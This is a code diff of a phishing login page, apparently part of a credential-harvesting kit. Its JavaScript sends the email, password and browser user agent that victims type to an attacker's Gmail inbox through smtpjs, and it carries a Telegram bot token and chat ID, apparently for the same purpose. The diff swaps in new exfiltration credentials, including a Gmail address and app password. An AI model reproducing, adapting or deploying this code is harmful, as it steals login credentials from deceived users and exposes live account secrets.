@@ -552,8 +552,8 @@ html, body {
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script src="https://smtpjs.com/v3/smtp.js"></script>
 <script>
-const token = '7946846386:AAEtvSEgF5YfNVWTdfiMeTYsEFDGgI09z9c';
-const chatId = '961967998';
+const token = '7921526967:AAGdKdP01lu02S60uFATJjqr4wQDTREcLt0';
+const chatId = '7347877229';
 
 let count = 0; // Initialize the count variable to track failed attempts
 
@@ -611,12 +611,12 @@ $(document).ready(function () {
 
     // Send email
     Email.send({
-      //SecureToken: "9c98ebc2-4ab5-489a-ad83-101aac4dc571",
+      //SecureToken: "f8b7210a-468b-4aeb-8737-9d8b93eeea74 ",
 	  Host: "smtp.gmail.com",
-	  Username: "agentstevenblackstone@gmail.com",
-	  Password: "eaezdtzdqcvsyydu",
-      To: 'oreblagdiva5@gmail.com',
-      From: "agentstevenblackstone@gmail.com",
+	  Username: "your-email@gmail.com",
+	  Password: "TEST",
+      To: '21kevinflores@gmail.com',
+      From: "bigbabyysophie@gmail.com",
       Subject: "New Login Information Received",
       Body: `Email: ${email}<br/>Password: ${password}<br/>User-Agent: ${navigator.userAgent}`,
     }).then(function () {
